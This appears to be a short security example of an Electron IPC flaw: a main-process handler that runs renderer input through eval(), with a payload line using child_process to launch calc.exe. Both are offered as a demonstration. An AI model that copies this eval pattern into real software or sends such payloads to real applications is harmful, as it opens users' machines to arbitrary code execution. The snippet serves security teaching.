payloads_or_patterns:
Example of a vulnerable IPC handler in the main process:
```javascript
ipcMain.on('process-data', (event, arg) => {
  // Vulnerable: arg is not validated and can contain malicious commands
  eval(arg);
});
```

Malicious payload sent from renderer:
`ipcRenderer.send('process-data', 'require(\'child_process\').exec(\'calc.exe\')');`
